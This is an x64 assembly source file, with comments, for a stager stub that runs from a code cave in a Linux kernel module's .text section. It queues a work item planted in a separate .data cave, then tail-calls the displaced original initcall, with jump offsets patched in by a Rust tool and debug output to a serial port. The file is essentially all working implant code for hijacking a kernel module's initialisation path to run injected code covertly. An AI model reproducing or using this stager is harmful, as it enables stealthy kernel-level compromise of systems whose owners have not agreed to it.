; lkm_stager.asm
; x64 initcall stub executed from a .text cave.
;
; This queues a work_struct stored in a separate .data cave, then tail-calls the
; displaced original initcall. Rust preinitializes the work_struct fields before
; writing the data blob. No code is executed from .data.
;
; Sentinels patched as i32 PC-relative offsets by Rust:
;   WORK_STRUCT_DISP_SENTINEL   0x11223344  disp32 for lea rdi,[rip+d]
;   SCHEDULE_WORK_REL_SENTINEL  0xAABBCCDD  rel32 for call schedule_work
;   ORIGINAL_FN_REL_SENTINEL    0x12345678  rel32 for jmp original initcall

BITS 64

lkm_stager:
    push    rbp

    mov     dx, 0x3F8
    mov     al, 'S'
    out     dx, al

    db      0x48, 0x8D, 0x3D
    dd      0x11223344

    db      0xE8
    dd      0xAABBCCDD

    mov     dx, 0x3F8
    mov     al, 'Q'
    out     dx, al

    pop     rbp

    db      0xE9
    dd      0x12345678
